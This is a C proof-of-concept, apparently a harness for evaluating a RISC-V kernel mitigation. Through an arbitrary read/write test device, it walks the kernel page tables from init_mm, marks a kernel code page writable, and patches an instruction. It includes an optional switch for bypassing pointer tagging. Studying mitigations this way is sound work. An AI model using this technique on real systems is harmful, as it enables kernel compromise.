// FZY: Proof of concept that starts from init_mm, follows its .pgd field to
// walk the RISC-V Sv48 kernel page table (PGD -> PUD -> PMD -> PTE) down to the
// leaf entry of a kernel code page, then flips that entry's permission bits
// from read-execute to read-write-execute.
//
// init_mm is the kernel's own mm_struct and its .pgd field is where every
// kernel page table walk starts, so reaching it is enough to rewrite the
// permissions of any kernel mapping.
//
// Under CONFIG_SDP_CACHE init_mm lives in the sdp cache and is only reachable
// through the __tagone pointer __init_mm_ptr. Under CONFIG_SDP_PGTABLE every
// page table page is allocated from a hidden pool that is kept out of the
// linear mapping and mapped at a random kernel virtual address; the pool is
// reachable only through the __tagone pointers mm_struct::pgd and
// sdp_pt_va_base, so each next-level physical address has to be translated
// through the pool base instead of through the linear mapping.

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_FLUSH_TLB _IO('A', 9)

// RISC-V page table entry bits
#define PTE_V (1UL << 0) // Valid
#define PTE_R (1UL << 1) // Read
#define PTE_W (1UL << 2) // Write
#define PTE_X (1UL << 3) // Execute
#define PTE_U (1UL << 4) // User
#define PTE_G (1UL << 5) // Global
#define PTE_A (1UL << 6) // Accessed
#define PTE_D (1UL << 7) // Dirty

#define PTE_PPN_SHIFT 10
#define PAGE_SHIFT 12

// Sv48: 4 levels, 9 bits per level
// VPN[3] = VA[47:39] -> PGD index
// VPN[2] = VA[38:30] -> PUD index
// VPN[1] = VA[29:21] -> PMD index
// VPN[0] = VA[20:12] -> PTE index
#define SV48_LEVELS 4

// struct kernel_mapping field offset for va_pa_offset (6th field, all 8 bytes on rv64):
//   page_offset(0), virt_addr(8), virt_offset(16), phys_addr(24), size(32),
//   va_pa_offset(40)
#define KERNEL_MAP_VA_PA_OFFSET 40

// CONFIG_SDP_PGTABLE_POOL_MB, the pool is reserved at boot and never grows
#define SDP_PT_POOL_MB 256
#define SDP_PT_POOL_SIZE ((unsigned long)SDP_PT_POOL_MB << 20)

// FZY: A plain load of a __tagone slot returns the pointer with its upper 16
// bits cleared. Restoring the kernel VA prefix bypasses the mitigation, so set
// this to 1 only to evaluate whether the rest of the steps work; at 0 (the
// default) the walk fails on the protected pointer, which is the point.
#define SDP_BYPASS_TAG 0

// A leaf entry has at least one of R/W/X set
#define PTE_IS_LEAF(e) (((e) & (PTE_R | PTE_W | PTE_X)) != 0)
// Extract physical address from a PTE
#define PTE_PA(e) (((e) >> PTE_PPN_SHIFT) << PAGE_SHIFT)

static const char *level_names[] = {"PTE (L0)", "PMD (L1)", "PUD (L2)",
                                    "PGD (L3)"};

// How a page table physical address is turned back into a virtual address
struct pt_map {
  int use_pool;              // 1: sdp hidden pool, 0: linear mapping
  unsigned long pool_va_base; // sdp_pt_va_base
  unsigned long pool_pa_base; // sdp_pt_pa_base
  long va_pa_offset;         // kernel_map.va_pa_offset
};

static void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

static void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// FZY: Undo the masking a plain load applies to a __tagone slot
static unsigned long untag(unsigned long val) {
#if SDP_BYPASS_TAG
  return val | 0xFFFF000000000000UL;
#else
  return val;
#endif
}

// Translate a page table page's physical address into the virtual address the
// kernel itself uses for it. Returns 0 when the address is out of reach.
static unsigned long pt_pa_to_va(const struct pt_map *map, unsigned long pa) {
  if (!map->use_pool)
    return pa + (unsigned long)map->va_pa_offset;

  // sdp_pt_pfn_to_virt(): pool pages keep their offset within the pool
  if (pa - map->pool_pa_base >= SDP_PT_POOL_SIZE)
    return 0;

  return map->pool_va_base + (pa - map->pool_pa_base);
}

static void print_pte_flags(unsigned long pte) {
  printf("    Flags: %c%c%c%c%c%c%c%c  (raw bits [9:0] = 0x%03lx)\n",
         (pte & PTE_V) ? 'V' : '-', (pte & PTE_R) ? 'R' : '-',
         (pte & PTE_W) ? 'W' : '-', (pte & PTE_X) ? 'X' : '-',
         (pte & PTE_U) ? 'U' : '-', (pte & PTE_G) ? 'G' : '-',
         (pte & PTE_A) ? 'A' : '-', (pte & PTE_D) ? 'D' : '-',
         pte & 0x3FF);
}

static void hexdump(int fd, unsigned long va, size_t len) {
  unsigned char buf[16];
  for (size_t off = 0; off < len; off += 16) {
    size_t chunk = (len - off < 16) ? len - off : 16;
    arb_read(fd, va + off, buf, chunk);
    printf("    %016lx: ", va + off);
    for (size_t j = 0; j < chunk; j++)
      printf("%02x ", buf[j]);
    printf("\n");
  }
}

static void usage(const char *prog) {
  printf("Usage (mode 0):   %s 0 <init_mm_addr> <pgd_offset> <target_va> "
         "<kernel_map_addr|va_pa_offset>\n",
         prog);
  printf("Usage (mode 1/2): %s <mode> <init_mm_ptr_addr> <pgd_offset> "
         "<target_va> <sdp_pt_va_base_addr> <sdp_pt_pa_base_addr>\n\n",
         prog);
  printf("  mode:    0 = no protection, 1/2 = SDP protection\n");
  printf("  init_mm_addr:\n");
  printf("      mode 0:   nm vmlinux | grep ' init_mm$'\n");
  printf("      mode 1/2: nm vmlinux | grep __init_mm_ptr\n");
  printf("  pgd_offset: pahole -C mm_struct vmlinux | grep -B1 pgd\n");
  printf("  target_va:  kernel code address to target, e.g., "
         "vulnerable_function in arbrw module\n");
  printf("      nm vmlinux | grep ' T _stext$'\n");
  printf("  mode 0, kernel_map_addr|va_pa_offset:\n");
  printf("      nm vmlinux | grep ' D kernel_map$'\n");
  printf("      or pass va_pa_offset value directly (prefix with 'v')\n");
  printf("      e.g.: v0xffff7fff80000000\n");
  printf("  mode 1/2, sdp page table pool base addresses:\n");
  printf("      nm vmlinux | grep ' sdp_pt_va_base$'\n");
  printf("      nm vmlinux | grep ' sdp_pt_pa_base$'\n");
}

int main(int argc, char *argv[]) {
  printf("[+] init_mm Exploitation PoC\n");
  printf("[+] Walk init_mm.pgd down to a kernel code PTE and make it "
         "writable\n\n");

  if (argc < 6 || argc > 7) {
    usage(argv[0]);
    return 1;
  }

  int mode = atoi(argv[1]);
  if ((mode == 0 && argc != 6) || (mode != 0 && argc != 7)) {
    usage(argv[0]);
    return 1;
  }

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  unsigned long init_mm_addr = strtoul(argv[2], NULL, 16);
  unsigned long pgd_offset = strtoul(argv[3], NULL, 0);
  unsigned long target_va = strtoul(argv[4], NULL, 16);

  // Step 1: locate init_mm. Under CONFIG_SDP_CACHE it lives in the sdp cache
  // and only the __tagone pointer __init_mm_ptr reaches it.
  if (mode != 0) {
    unsigned long ptr_val;
    arb_read(fd, init_mm_addr, &ptr_val, sizeof(ptr_val));
    printf("[+] __init_mm_ptr at 0x%lx contains: 0x%lx\n", init_mm_addr,
           ptr_val);
    init_mm_addr = untag(ptr_val);
  }
  printf("[+] init_mm:         0x%lx\n", init_mm_addr);

  // Step 2: read init_mm.pgd, the root of the kernel page table. Under
  // CONFIG_SDP_PGTABLE this field is __tagone and points into the hidden pool.
  unsigned long pgd_field = init_mm_addr + pgd_offset;
  unsigned long pgd_va;
  arb_read(fd, pgd_field, &pgd_va, sizeof(pgd_va));
  printf("[+] init_mm.pgd at 0x%lx (init_mm + %lu) contains: 0x%lx\n",
         pgd_field, pgd_offset, pgd_va);
  if (mode != 0)
    pgd_va = untag(pgd_va);
  printf("[+] Kernel PGD:      0x%lx\n", pgd_va);

  // Step 3: set up the physical-to-virtual translation used while descending
  struct pt_map map = {0};
  if (mode != 0) {
    // Page tables are in the sdp pool, outside the linear mapping.
    // sdp_pt_va_base is __tagone, sdp_pt_pa_base is useless without it.
    unsigned long va_base_addr = strtoul(argv[5], NULL, 16);
    unsigned long pa_base_addr = strtoul(argv[6], NULL, 16);
    unsigned long va_base;

    arb_read(fd, va_base_addr, &va_base, sizeof(va_base));
    printf("[+] sdp_pt_va_base at 0x%lx contains: 0x%lx\n", va_base_addr,
           va_base);
    arb_read(fd, pa_base_addr, &map.pool_pa_base, sizeof(map.pool_pa_base));
    printf("[+] sdp_pt_pa_base at 0x%lx contains: 0x%lx\n", pa_base_addr,
           map.pool_pa_base);

    map.use_pool = 1;
    map.pool_va_base = untag(va_base);
    printf("[+] Page table pool: VA 0x%lx  PA 0x%lx  size %d MiB\n",
           map.pool_va_base, map.pool_pa_base, SDP_PT_POOL_MB);
  } else if (argv[5][0] == 'v' || argv[5][0] == 'V') {
    // Direct value: vXXXX
    map.va_pa_offset = (long)strtoul(argv[5] + 1, NULL, 16);
    printf("[+] va_pa_offset (direct): 0x%lx\n",
           (unsigned long)map.va_pa_offset);
  } else {
    unsigned long kernel_map_addr = strtoul(argv[5], NULL, 16);

    // Dump kernel_map struct fields for verification
    printf("[+] kernel_map at 0x%lx:\n", kernel_map_addr);
    const char *field_names[] = {"page_offset", "virt_addr", "virt_offset",
                                 "phys_addr",   "size",      "va_pa_offset",
                                 "va_kernel_pa_offset", "va_kernel_xip_pa_offset"};
    for (int i = 0; i < 8; i++) {
      unsigned long val;
      arb_read(fd, kernel_map_addr + i * 8, &val, sizeof(val));
      printf("    [%2d] %-24s = 0x%lx\n", i * 8, field_names[i], val);
    }

    arb_read(fd, kernel_map_addr + KERNEL_MAP_VA_PA_OFFSET, &map.va_pa_offset,
             sizeof(map.va_pa_offset));
    printf("[+] Using va_pa_offset: 0x%lx\n", (unsigned long)map.va_pa_offset);
  }

  printf("[+] Target VA:       0x%lx\n", target_va);
  printf("[+] Page table mode: Sv48 (4 levels)\n\n");

  // Step 4: walk the Sv48 page table chain, starting from init_mm.pgd
  printf("[+] === PAGE TABLE WALK ===\n\n");

  unsigned long table_va = pgd_va;
  unsigned long leaf_pte_va = 0;
  unsigned long leaf_pte_val = 0;

  for (int lvl = SV48_LEVELS - 1; lvl >= 0; lvl--) {
    int shift = PAGE_SHIFT + 9 * lvl;
    unsigned long vpn = (target_va >> shift) & 0x1FF;
    unsigned long entry_va = table_va + vpn * 8;
    unsigned long entry;

    arb_read(fd, entry_va, &entry, sizeof(entry));

    printf("[+] %s: vpn_index = %lu\n", level_names[lvl], vpn);
    printf("    Table VA:  0x%lx\n", table_va);
    printf("    Entry VA:  0x%lx  (table + %lu*8)\n", entry_va, vpn);
    printf("    Entry val: 0x%lx\n", entry);
    print_pte_flags(entry);

    if (!(entry & PTE_V)) {
      printf("[-] Entry is INVALID (V=0). Aborting walk.\n");
      close(fd);
      return 1;
    }

    if (PTE_IS_LEAF(entry)) {
      printf("    >> Leaf entry found at level %d", lvl);
      if (lvl > 0)
        printf(" (mega/giga page)");
      printf("\n\n");
      leaf_pte_va = entry_va;
      leaf_pte_val = entry;
      break;
    }

    // Non-leaf: descend to the next-level table
    unsigned long next_pa = PTE_PA(entry);
    unsigned long next_va = pt_pa_to_va(&map, next_pa);
    if (!next_va) {
      printf("    -> Non-leaf, PA 0x%lx is outside the page table pool.\n",
             next_pa);
      printf("[-] Cannot reach the next level. Aborting walk.\n");
      close(fd);
      return 1;
    }
    printf("    -> Non-leaf, descending: PA 0x%lx -> VA 0x%lx\n\n", next_pa,
           next_va);
    table_va = next_va;
  }

  if (leaf_pte_va == 0) {
    printf("[-] Did not reach a leaf entry. Aborting.\n");
    close(fd);
    return 1;
  }

  // Sanity check: expect a kernel code page (R+X, no W)
  if (!(leaf_pte_val & PTE_R) || !(leaf_pte_val & PTE_X))
    printf("[!] WARNING: target PTE is not R+X as expected.\n");
  if (leaf_pte_val & PTE_W)
    printf("[!] WARNING: target PTE already has W bit set.\n");

  // Display original page content
  printf("[+] === PAGE CONTENT BEFORE MODIFICATION ===\n");
  printf("    (first 64 bytes of code at 0x%lx)\n", target_va);
  hexdump(fd, target_va, 64);

  // Step 5: modify the leaf PTE, R+X -> R+W+X
  printf("\n[+] === MODIFYING LEAF PTE: R+X -> R+W+X ===\n");
  printf("    PTE address: 0x%lx\n", leaf_pte_va);
  printf("    Before: 0x%lx\n", leaf_pte_val);
  print_pte_flags(leaf_pte_val);

  unsigned long new_pte = leaf_pte_val;
  // new_pte &= ~PTE_X;        // Remove execute permission
  new_pte |= PTE_W | PTE_D; // Add write permission (+ dirty bit)

  printf("    After:  0x%lx\n", new_pte);
  print_pte_flags(new_pte);
  arb_write(fd, leaf_pte_va, &new_pte, sizeof(new_pte));

  // Verify the write took effect
  unsigned long verify_pte;
  arb_read(fd, leaf_pte_va, &verify_pte, sizeof(verify_pte));
  printf("    Readback: 0x%lx  %s\n", verify_pte,
         (verify_pte == new_pte) ? "(OK)" : "(MISMATCH!)");
  print_pte_flags(verify_pte);

  // Flush TLB so the CPU picks up the new PTE
  printf("\n[+] Flushing TLB (sfence.vma via ioctl)...\n");
  if (ioctl(fd, ARB_FLUSH_TLB) < 0) {
    perror("ARB_FLUSH_TLB");
    // continue anyway
  }

  // Save original bytes, then write NOP
  unsigned int orig_insn;
  arb_read(fd, target_va, &orig_insn, sizeof(orig_insn));
  printf("[+] Original instruction at 0x%lx: 0x%08x\n", target_va, orig_insn);

  unsigned int nop = 0x00000013; // RISC-V 32-bit NOP: addi x0, x0, 0
  printf("[+] Writing NOP (0x%08x) to 0x%lx...\n", nop, target_va);
  arb_write(fd, target_va, &nop, sizeof(nop));

  // Display page content after PTE modification
  printf("\n[+] === PAGE CONTENT AFTER MODIFICATION ===\n");
  printf("    (first 64 bytes of code at 0x%lx)\n", target_va);
  hexdump(fd, target_va, 64);

  // Show manifestation
  printf("\n[+] === MANIFESTATION ===\n");
  printf("[+] Starting from init_mm, the walk followed its .pgd field to the\n");
  printf("[+] leaf PTE for kernel code at 0x%lx and changed it:\n", target_va);
  printf("[+]   BEFORE: V=%d R=%d W=%d X=%d  (read-execute)\n",
         !!(leaf_pte_val & PTE_V), !!(leaf_pte_val & PTE_R),
         !!(leaf_pte_val & PTE_W), !!(leaf_pte_val & PTE_X));
  printf("[+]   AFTER:  V=%d R=%d W=%d X=%d  (read-write-execute)\n",
         !!(verify_pte & PTE_V), !!(verify_pte & PTE_R),
         !!(verify_pte & PTE_W), !!(verify_pte & PTE_X));
  printf("[+] A kernel code page that was read-execute is now read-write-execute.\n");
  printf("[+] An attacker could now overwrite kernel code (after TLB flush).\n");

  // Restore original instruction, then PTE
  printf("\n[+] Restoring original instruction (0x%08x)...\n", orig_insn);
  arb_write(fd, target_va, &orig_insn, sizeof(orig_insn));

  printf("[+] Restoring original PTE (R+X)...\n");
  arb_write(fd, leaf_pte_va, &leaf_pte_val, sizeof(leaf_pte_val));

  // Flush TLB again so the restored R+X PTE takes effect
  ioctl(fd, ARB_FLUSH_TLB);

  unsigned long restored;
  arb_read(fd, leaf_pte_va, &restored, sizeof(restored));
  printf("[+] Restored PTE: 0x%lx  %s\n", restored,
         (restored == leaf_pte_val) ? "(OK)" : "(MISMATCH!)");

  close(fd);
  return 0;
}
